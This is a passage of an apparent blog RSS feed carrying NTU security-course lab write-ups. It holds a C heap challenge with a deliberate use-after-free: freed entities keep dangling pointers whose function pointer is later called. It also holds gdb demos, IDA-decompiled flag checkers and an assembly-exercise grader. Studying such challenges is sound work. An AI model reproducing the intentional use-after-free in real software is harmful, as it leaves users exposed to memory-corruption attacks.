&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx] &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Default Event&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle &lt;span style="color:#f92672">=&lt;/span> default_handle;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Nmae Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	len &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (len &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> len &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x430&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name &lt;span style="color:#f92672">=&lt;/span> malloc(len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Name: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name, len &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">trigger_event&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			register_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			trigger_event();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x01(Lab - Sacred Arts)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/</guid><description>&lt;h1 id="simple-reverse---0x01lab---sacred-arts">
 Simple Reverse - 0x01(Lab - Sacred Arts)
 &lt;a class="anchor" href="#simple-reverse---0x01lab---sacred-arts">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://zh.wikibooks.org/wiki/X86%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80/%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4%E9%9B%86">X86組合語言/基本指令集&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.ibm.com/docs/en/aix/7.1?topic=set-neg-negate-instruction">neg (Negate) instruction&lt;/a>
實作：先在執行&lt;code>neg rax&lt;/code>之前把&lt;code>$rax&lt;/code>設定成2，執行指令之後剛好是2的補數
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">gef➤ set $rax=2
gef➤ info r $rax
rax 0x2 0x2
gef➤ ni
0x00000000004010e0 in ?? ()
gef➤ info r $rax
rax 0xfffffffffffffffe 0xfffffffffffffffe
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://zh.wikibooks.org/zh/X86%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80/%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4%E9%9B%86/IA32%E6%8C%87%E4%BB%A4:xchg">X86組合語言/基本指令集/IA32指令:xchg&lt;/a>
實作：執行&lt;code>xchg ah, al&lt;/code>之前先看一下&lt;code>$rax&lt;/code>的狀態
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">gef➤ info r $rax
rax 0xfffffffffffffffe 0xfffffffffffffffe
gef➤ ni
0x00000000004010e2 in ?? ()
gef➤ info r $rax
rax 0xfffffffffffffeff 0xfffffffffffffeff
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Pro Disassembler Code&lt;/p></description></item><item><title>Simple Reverse - 0x03(Lab - Why)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/</guid><description>&lt;h1 id="simple-reverse---0x03lab---why">
 Simple Reverse - 0x03(Lab - Why)
 &lt;a class="anchor" href="#simple-reverse---0x03lab---why">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://chenhh.gitbooks.io/parallel_processing/content/cython/function_pointer.html">What is function pointer?&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.youtube.com/live/IJlYPH1ljIY?feature=share&amp;amp;t=9587">Lecture Vid.&lt;/a>
&lt;img src="https://hackmd.io/_uploads/BJlVKMiO2.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main function&lt;/p>
&lt;pre tabindex="0">&lt;code>int __cdecl main(int argc, const char **argv, const char **envp)
{
 int i; // [rsp+Ch] [rbp-4h]

 printf(&amp;#34;Give me flag: &amp;#34;);
 __isoc99_scanf(&amp;#34;%25s&amp;#34;, buf);
 for ( i = 0; i &amp;lt;= 24; ++i )
 {
 if ( buf[i] - 10 != enc_flag[i] )
 return 0;
 }
 pass = 1;
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x14(2023 Lab - AssemblyDev)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/</guid><description>&lt;h1 id="simple-reverse---0x142023-lab---assemblydev">
 Simple Reverse - 0x14(2023 Lab - AssemblyDev)
 &lt;a class="anchor" href="#simple-reverse---0x142023-lab---assemblydev">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Tools
&lt;a href="https://carlosrafaelgn.com.br/Asm86/">Assembly x86 Emulator&lt;/a>
&lt;a href="https://godbolt.org/">Compiler Explorer&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler arithmatic.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> module.checker &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> module.math &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> sys &lt;span style="color:#f92672">import&lt;/span> argv
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>challenge_info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">let a = MEM[RSP+0x0:RSP+0x4]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">let b = MEM[RSP+0x4:RSP+0x8]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">let c = MEM[RSP+0x8:RSP+0xc]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EAX = a + b
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EBX = a - b
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">ECX = -c
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EDX = 9*a + 7
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>a &lt;span style="color:#f92672">=&lt;/span> get_rand(&lt;span style="color:#ae81ff">4&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b &lt;span style="color:#f92672">=&lt;/span> get_rand(&lt;span style="color:#ae81ff">4&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c &lt;span style="color:#f92672">=&lt;/span> get_rand(&lt;span style="color:#ae81ff">4&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>init_list &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (RSP_DEFAULT &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x0&lt;/span>, a, &lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (RSP_DEFAULT &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x4&lt;/span>, b, &lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (RSP_DEFAULT &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span>, c, &lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ans_list &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;eax&amp;#34;&lt;/span>, add(a, b, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;ebx&amp;#34;&lt;/span>, sub(a, b, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;ecx&amp;#34;&lt;/span>, neg(c, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;edx&amp;#34;&lt;/span>, add(mul(a, &lt;span style="color:#ae81ff">9&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>), &lt;span style="color:#ae81ff">7&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(argv) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>C&lt;span style="color:#f92672">.&lt;/span>BLUE&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">[+]&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>C&lt;span style="color:#f92672">.&lt;/span>NC&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> Usage: python3 &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>__file__&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &amp;lt;path_to_asm_file&amp;gt;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(challenge_info)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#f92672">=&lt;/span> open(argv[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Checker(init_list, ans_list, code)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler data_movement.py&lt;/p></description></item><item><title>Simple Reverse - 0x15(2023 HW - crackme_vectorization)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/</guid><description>&lt;h1 id="simple-reverse---0x152023-hw---crackme_vectorization">
 Simple Reverse - 0x15(2023 HW - crackme_vectorization)
 &lt;a class="anchor" href="#simple-reverse---0x152023-hw---crackme_vectorization">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> a1, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a2, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> __isoc99_scanf(&lt;span style="color:#e6db74">&amp;#34;%d&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>user_input_len); &lt;span style="color:#75715e">// 長度為49
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> user_input_len_cp &lt;span style="color:#f92672">=&lt;/span> user_input_len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqrt_length &lt;span style="color:#f92672">=&lt;/span> sqrt((&lt;span style="color:#66d9ef">double&lt;/span>)user_input_len); &lt;span style="color:#75715e">// 開根號後是7
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> sqrt_length_cp &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)sqrt_length;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( sqrt_length &lt;span style="color:#f92672">&amp;gt;&lt;/span> (&lt;span style="color:#66d9ef">double&lt;/span>)(&lt;span style="color:#66d9ef">int&lt;/span>)sqrt_length )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>sqrt_length_cp;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqrt_len &lt;span style="color:#f92672">=&lt;/span> _mm_shuffle_epi32(_mm_cvtsi32_si128(sqrt_length_cp), &lt;span style="color:#ae81ff">224&lt;/span>).m128i_u64[&lt;span style="color:#ae81ff">0&lt;/span>];&lt;span style="color:#75715e">// 原本的shuffle num就是user input length的開根號結果
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> space &lt;span style="color:#f92672">=&lt;/span> (struc_1 &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x10uLL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sqrt_len &lt;span style="color:#f92672">=&lt;/span> sqrt_len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">*&lt;/span> sqrt_length_cp &lt;span style="color:#f92672">*&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)sqrt_length_cp;&lt;span style="color:#75715e">// size是196
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> shuffle_space &lt;span style="color:#f92672">=&lt;/span> malloc(size);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space&lt;span style="color:#f92672">-&amp;gt;&lt;/span>content_space &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)shuffle_space;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( user_input_len_cp &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shuffle_space_cp &lt;span style="color:#f92672">=&lt;/span> shuffle_space;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> __isoc99_scanf(&lt;span style="color:#e6db74">&amp;#34;%d&amp;#34;&lt;/span>, content);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shuffle_space_cp[len&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> content[&lt;span style="color:#ae81ff">0&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( user_input_len &lt;span style="color:#f92672">&amp;gt;&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)len ); &lt;span style="color:#75715e">// 要輸入東西49次
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( length &lt;span style="color:#f92672">==&lt;/span> sqrt_length_cp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (space_1 &lt;span style="color:#f92672">=&lt;/span> (struc_1 &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x10uLL&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space_1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sqrt_len &lt;span style="color:#f92672">=&lt;/span> sqrt_len,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shuffle_space_1 &lt;span style="color:#f92672">=&lt;/span> malloc(size),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">=&lt;/span> cipher_flag,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space_1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>content_space &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)shuffle_space_1,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memcpy(shuffle_space_1, src, size),
